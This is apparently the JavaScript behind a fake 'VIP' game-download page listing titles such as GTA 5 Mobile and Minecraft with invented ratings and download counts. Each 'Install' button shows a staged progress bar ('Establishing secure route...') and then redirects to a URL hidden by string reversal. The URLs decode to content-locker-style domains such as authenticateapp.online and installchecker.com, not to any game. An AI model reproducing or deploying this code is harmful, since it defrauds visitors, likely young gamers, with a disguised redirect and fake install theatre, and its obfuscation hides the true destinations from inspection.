const appData = [
    ["Brawl Stars Pro", "https://i.postimg.cc/pLx3994j/a75502cbdd3578e9fc148dc81045e8dc.jpg", "m832xe/i/lc/enilno.ppaetacitnehtua//:sptth", "4.8", "5.2M"],
    ["Temple Run 2", "https://i.postimg.cc/Jh09gPHb/images.webp", "kpvo2d/i/lc/erots.ppaymkcehc//:sptth", "4.8", "3.0M"],
    ["Poppy Playtime 5", "https://i.postimg.cc/RCW4g6rv/images-(2).jpg", "k2lln5/i/lc/enilno.ppaetacitnehtua//:sptth", "4.9", "1.5M"],
    ["Fifa Street 2 Mobile", "https://i.postimg.cc/gcwd46F6/fifa-street-2.png", "kgjvj7/i/lc/enilno.ppaetacitnehtua//:sptth", "4.8", "2.2M"],
    ["Car Parking M.", "https://i.postimg.cc/SN6vfCPD/855bb14ff7d1a7833d3fcd31841cd486.jpg", "693o2d/i/lc/enilno.ppaetacitnehtua//:sptth", "4.9", "2.8M"],
    ["Spider-Man 2 Mobile", "https://i.postimg.cc/FHLX56wW/images-(1).jpg", "8ke35m/i/lc/erots.ppaymkcehc//:sptth", "4.9", "3.4M"],
    ["CarX Drift Racing 2", "https://i.postimg.cc/76R13gHD/1683877186-carx-drift-racing-2.png", "mx4l43/i/lc/enilno.ppaetacitnehtua//:sptth", "4.9", "4.1M"],
    ["Real Racing 3", "https://i.postimg.cc/Ss2h5p1z/59d734a3a0393d260f23865083fd2e18.jpg", "4l9rem/i/lc/ten.ppadekcol//:sptth", "4.9", "2.8M"],
    ["GTA 5 Mobile", "https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png", "2m7n6o/i/lc/moc.rekcehcllatsni//:sptth", "4.7", "5.1M"],
    ["Snake Mod Menu", "https://i.postimg.cc/j51BnqYy/NG4s-ZTG49qp-KGd3t-Uxdoxb-W2EXSp1-n-Axc-Yr3XCO0SO1WO5P2s-Wkk0s-Bt-UGZPYz-POU0-s150-rw.png", "7j4l43/i/lc/enilno.ppaetacitnehtua//:sptth", "4.7", "1.2M"],
    ["Minecraft", "https://i.postimg.cc/cHHJqfpb/3ff42c8168cb146b6a0458e6b81c8d2e.jpg", "xmvlov/i/lc/moc.rekcehcllatsni//:sptth", "5.0", "4.2M"],
    ["Terraria", "https://cdn.cloudflare.steamstatic.com/steam/apps/105600/header.jpg", "295p6g/i/lc/moc.rekcehcllatsni//:sptth", "4.8", "1.9M"],
    ["Dead Trigger 2", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTeVXv_WH25sdbzNee5mGGSNZcgrdbHfyjDGtY7r6AYyA&s", "2dklov/i/lc/moc.rekcehcllatsni//:sptth", "4.6", "1.4M"],
    ["Granny", "https://www.pngkey.com/png/detail/300-3001204_granny-sticker-granny-horror-game-costume.png", "w3r8vd/i/lc/moc.rekcehcllatsni//:sptth", "4.5", "3.7M"],
    ["Jetpack Joyride", "https://images.launchbox-app.com/efa13945-48d2-4a08-a507-f27cf6bef1b8.png", "4n227r/i/lc/moc.rekcehcllatsni//:sptth", "4.8", "2.1M"],
    ["Asphalt 8", "https://i.postimg.cc/1X1DzH47/da6894949fa87d0a60fbe4022d5de3a2.jpg", "9w8kdn/i/lc/moc.rekcehcllatsni//:sptth", "4.9", "3.5M"],
    ["Shadow Fight 3", "https://i.postimg.cc/HxwXtKm1/fdee4ab6e6875d72d84d05a4c977555e.jpg", "6nex73/i/lc/moc.rekcehcllatsni//:sptth", "4.7", "2.6M"],
    ["Madfut 25", "https://i.postimg.cc/zf3f6CZP/download-5.jpg", "62e7kq/i/lc/moc.rekcehcllatsni//:sptth", "4.6", "1.8M"],
    ["Zombie Catchers", "https://i.postimg.cc/QdkVCP7Z/b25d3f7258c599d00eb5f9dad2bff200.jpg", "4de7kq/i/lc/moc.rekcehcllatsni//:sptth", "4.8", "2.3M"],
    ["Modern Combat 5", "https://i.postimg.cc/pLnqBfcM/0ea3ead68ff72e83c6a758ee22a0325f.jpg", "9wdgd7/i/lc/moc.rekcehcllatsni//:sptth", "4.5", "1.6M"],
    ["Football League 2025", "https://i.postimg.cc/ncDknT3B/2aef3e1f170c3941d0cce829192d9c3b.jpg", "l9q8op/i/lc/moc.rekcehcllatsni//:sptth", "4.9", "2.9M"],
    ["Into the Dead 2", "https://i.postimg.cc/FHFWWMPg/9fe5d0c6e4fb3a3fff88499966f15bd1.jpg", "q55w6o/i/lc/moc.rekcehcllatsni//:sptth", "4.7", "1.7M"],
    ["MadOut2 BigCity", "https://i.postimg.cc/d3mdM6Cr/906806bde826c9dfa39075643435217a.jpg", "42dqo4/i/lc/gro.dekcolppa//:sptth", "4.8", "2.4M"],
    ["Cover Fire", "https://i.postimg.cc/NG4w4Pwm/052e16397cb7b90b15e4dac048bbc369.jpg", "4gl25m/i/lc/gro.ppadekcol//:sptth", "4.6", "1.5M"],
    ["BitLife", "https://i.postimg.cc/tJmRYM0f/955488d3c0d197fd0e3973d92ad718dd.jpg", "vp266n/i/lc/erots.ppadekcol//:sptth", "4.9", "4.1M"],
    ["Plague Inc", "https://i.postimg.cc/BQ10NsPH/02d2e0c943d34331dd722a06ef9efc03.jpg", "xw9oo4/i/lc/erots.dekcolppa//:sptth", "4.8", "2.2M"],
    ["Rebel Inc", "https://i.postimg.cc/Wbm7ry3X/2df0d3efe8ed56b0bb83ac277374cc7a.jpg", "4qdnnq/i/lc/enilno.ppakcehc//:sptth", "4.7", "1.3M"],
    ["Hill Climb Racing 2", "https://i.postimg.cc/rsP4g4D7/aa3be2a2e638d5397e9ff23d1068a568.jpg", "6g177l/i/lc/enilno.ppakcehc//:sptth", "4.9", "3.2M"],
    ["Alto’s Adventure", "https://i.postimg.cc/wymvtvYy/altos-adventure.jpg", "4gnqqp/i/lc/etis.ppamrifnoc//:sptth", "4.5", "1.1M"],
    ["The Spike Volleyball", "https://thespikevolleyball.com/wp-content/uploads/2025/08/The-Spike-Mod-APK-2.webp", "mkwxxe/i/lc/etis.rekcehcppa//:sptth", "4.8", "1.9M"],
    ["GTA LA Crimes", "https://i.postimg.cc/Pqp7hf2P/622662a266a03ab7ee561cecda51c6a7.jpg", "eq9rrk/i/lc/erots.rekcehcppa//:sptth", "4.6", "1.8M"],
    ["Dream League 2026", "https://i.postimg.cc/NMnrRyFG/39b6681f328367cd9ebfc5f444480e86.jpg", "vpk66w/i/lc/etis.rekcehcppa//:sptth", "4.9", "3.8M"],
    ["Madden NFL 26", "https://i.postimg.cc/XqQRPt9g/ddafd8b13cfe21e445a65c626957b372-(1).jpg", "r33oo4/i/lc/etis.rekcehcppa//:sptth", "4.8", "2.7M"],
    ["Stumble Guys 2026", "https://i.postimg.cc/jdq2Fg30/288f59ad4205a9503c3a91cb016e032a.jpg", "ner55m/i/lc/etis.rekcehcppa//:sptth", "4.9", "4.5M"],
    ["Retro Bowl", "https://i.postimg.cc/8cBgT1XT/unnamed-(2).webp", "6xl66n/i/lc/etis.ppaymkcehc//:sptth", "4.9", "2.1M"],
    ["R6 Mobile Beta", "https://i.postimg.cc/FstsX2L0/c7e4082374e7ecc4a7fc33ccbc0ca552.jpg", "6kp228/i/lc/etis.rekcehcppa//:sptth", "4.8", "1.7M"],
    ["COD Zombies", "https://i.postimg.cc/Mpr53bnr/4ef9e719439798004edefa37d6f5cc42.jpg", "548qqp/i/lc/erots.rekcehcppa//:sptth", "4.9", "3.2M"],
    ["Speed Stars 2026", "https://i.postimg.cc/RZGgTrfn/baeb948e5f0251d4065b19038b57db4a.jpg", "xexoo4/i/lc/etis.ppaymkcehc//:sptth", "4.8", "1.4M"],
    ["Block Blast", "https://i.postimg.cc/4yvc1WyY/50f9c884389b8a04f0393fec510c00b8.jpg", "eo7vrk/i/lc/erots.ppaymkcehc//:sptth", "4.9", "2.9M"],
    ["BeamNG.drive", "https://i.postimg.cc/y60nsB6F/779488e457a22a3592a631f255172ebd.jpg", "3q7v28/i/lc/erots.ppaymkcehc//:sptth", "4.9", "2.6M"]
];

function renderApps(data) {
    let grid = document.getElementById("main-grid");
    let html = "";
    for(let i=0; i<data.length; i++) {
        let app = data[i];
        html += `
        <div class="app-box">
            <span class="badge">VIP</span>
            <img loading="lazy" src="${app[1]}" alt="${app[0]}">
            <div class="app-content">
                <div class="app-title">${app[0]}</div>
                <div class="meta" style="display:flex; justify-content:space-between; font-size:12px; margin-bottom: 12px;">
                    <div>⭐ ${app[3]}</div>
                    <div style="color:#22c55e; font-weight:bold">${app[4]}</div>
                </div>
                <button class="action-btn" onclick="startSecureConnection('${app[2]}')">Install</button>
            </div>
        </div>`;
    }
    grid.innerHTML = html;
}

document.getElementById("search-input").oninput = function(e) {
    let val = e.target.value.toLowerCase();
    let filtered = appData.filter(app => app[0].toLowerCase().includes(val));
    renderApps(filtered);
};

function startSecureConnection(scrambledHash) {
    let modal = document.getElementById("secure-modal"), 
        bar = document.getElementById("progress-fill"), 
        perc = document.getElementById("progress-text"),
        desc = document.getElementById("status-desc");
    
    modal.style.display="flex"; 
    bar.style.width="0%";
    perc.innerText = "0%";
    desc.innerText = "Connecting to server...";
    
    perc.style.color = document.body.classList.contains('dark') ? "#fff" : "#1a1a1a";

    let p=0;
    let timer = setInterval(()=>{
        p += Math.floor(Math.random() * 6) + 1; 
        if(p > 100) p = 100;
        
        bar.style.width = p + "%";
        perc.innerText = p + "%";

        if(p > 30 && p < 70) desc.innerText = "Establishing secure route...";
        if(p >= 70 && p < 100) desc.innerText = "Preparing application access...";
        
        if(p >= 100) {
            clearInterval(timer);
            desc.innerText = "Redirecting securely...";
            
            setTimeout(() => {
                let finalUrl = scrambledHash.split('').reverse().join('');
                window.location.href = finalUrl; 
            }, 100);
        }
    }, 120);
}

function closeDialog(){ document.getElementById("secure-modal").style.display="none"; }
function switchMode(){ document.body.classList.toggle("dark"); }

renderApps(appData);
